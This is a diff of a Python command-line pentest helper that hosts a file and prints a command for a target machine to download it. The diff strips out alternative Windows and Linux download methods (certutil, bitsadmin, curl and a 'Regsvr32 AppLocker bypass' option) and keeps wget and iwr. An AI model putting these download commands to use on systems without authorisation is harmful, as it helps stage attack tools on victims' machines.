@@ -32,28 +32,13 @@ def signal_handler(sig, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 # Géstion de la syntaxe
-def Syntaxe(OS, IPHOST, selected_file, selected_port,Payload):
+def Syntaxe(OS, IPHOST, selected_file, selected_port):
     style = ("bg_black", "fg_yellow", "bold")
     while True:  # Boucle pour réessayer avec un nouveau port en cas d'échec
         if OS == "Linux" or OS == "linux": 
-            if Payload == "Wget":
-                syntaxeFinal = f'wget http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
-            elif Payload == "Curl":
-                syntaxeFinal = f'curl http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -o {os.path.basename(selected_file)}'
-    
-
+            syntaxeFinal = f'wget http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
         elif OS == "Windows" or OS == "windows":
-            if Payload == "Iwr":
-                syntaxeFinal = f'iwr http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -O {os.path.basename(selected_file)}'
-            elif Payload == "Certutil":
-                syntaxeFinal = f'certutil.exe -urlcache -f http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
-            elif Payload == "Wget":
-                syntaxeFinal = f'wget http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -OutFile {os.path.basename(selected_file)}'
-            elif Payload =="Bitsadmin":
-                syntaxeFinal = f'bitsadmin.exe /transfer 5720 /download /priority normal http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} {os.path.basename(selected_file)}'
-            elif Payload == "Regsvr32":
-                syntaxeFinal = f'AppLocker bypass http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
-            
+            syntaxeFinal = f'iwr http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)} -O {os.path.basename(selected_file)}'
         else:
             print("/!\  \033[91mERROR\033[0m  : unsupported operating system")
             return
@@ -117,7 +102,7 @@ def check_user_capabilities():
         print("You must run this script with root privileges or assign the necessary capabilities to the Python binary.")
         return False
     
-def OS_menu(os_arg=None, payload_arg=None):
+def OS_menu(os_arg=None):
     # Menu système d'exploitation de la cible :
     if os_arg is not None:
         return os_arg
@@ -128,30 +113,7 @@ def OS_menu(os_arg=None, payload_arg=None):
         terminal_menu = TerminalMenu(target_OS, menu_cursor="=>  ", menu_highlight_style=style, title="What is the target OS?")
         menu_entry_index = terminal_menu.show()
         selected_os = target_OS[menu_entry_index]
-
-    # Menu Payload
-    if selected_os.lower() == "linux":
-        payload_type = ["Wget", "Curl"]
-        if payload_arg is not None:
-            selected_payload = payload_arg
-        else:
-            payload_menu = TerminalMenu(payload_type, menu_cursor="=>  ", menu_highlight_style=style, title="What type of command do you want?")
-            payload_menu_entry_index = payload_menu.show()
-            selected_payload = payload_type[payload_menu_entry_index]
-
-    elif selected_os.lower() == "windows":
-        payload_type = ["Iwr", "Certutil", "Wget","Bitsadmin","Regsvr32"]
-        if payload_arg is not None:
-            selected_payload = payload_arg
-        else:
-            payload_menu = TerminalMenu(payload_type, menu_cursor="=>  ", menu_highlight_style=style, title="What type of command do you want?")
-            payload_menu_entry_index = payload_menu.show()
-            selected_payload = payload_type[payload_menu_entry_index]
-    else:
-        print("ERROR")
-
-    return target_OS[menu_entry_index],payload_type[payload_menu_entry_index]
-    
+    return selected_os
 
 def IP_menu(IPHOST, style, port=None):
     if port is not None:
@@ -177,9 +139,9 @@ def IP_menu(IPHOST, style, port=None):
                 selected_port = int(input("Please enter another port : "))
         return selected_port
 
-def MenuGeneral(os_arg=None, dir_arg=None, port=None,payload_arg=None):
+def MenuGeneral(os_arg=None, dir_arg=None, port=None):
     style = ("bg_black", "fg_yellow", "bold")
-    OS, Payload = OS_menu(os_arg, payload_arg)
+    OS = OS_menu(os_arg)
   
 
     # Menu choix de l'interface réseau
@@ -228,7 +190,7 @@ def MenuGeneral(os_arg=None, dir_arg=None, port=None,payload_arg=None):
  
     selected_port = IP_menu(IPHOST, style, port)
 
-    return OS, IPHOST, selected_file, selected_port,Payload
+    return OS, IPHOST, selected_file, selected_port
 
 def main():
     parser = argparse.ArgumentParser(description="Tool for quickly downloading files to a remote machine based on the target operating system. Launch the program and follow the prompts.",
@@ -236,12 +198,11 @@ def main():
     parser.add_argument("--port","-p", type=int, help="Specify the port to use.")
     parser.add_argument("--os","-os", type=str, help="Specify the target operating system. (Linux or Windows)")
     parser.add_argument("--dir","-d", type=str, help="Specify the directory of your file.")
-    parser.add_argument("--payload",type=str,help="Type of Payload")
     args = parser.parse_args()
    
    
-    OS, IPHOST, selected_file, selected_port,Payload = MenuGeneral(args.os, args.dir, args.port,args.payload)
-    Syntaxe(OS, IPHOST, selected_file, selected_port,Payload)
+    OS, IPHOST, selected_file, selected_port = MenuGeneral(args.os, args.dir, args.port)
+    Syntaxe(OS, IPHOST, selected_file, selected_port)
 
 if __name__ == "__main__":
     main()
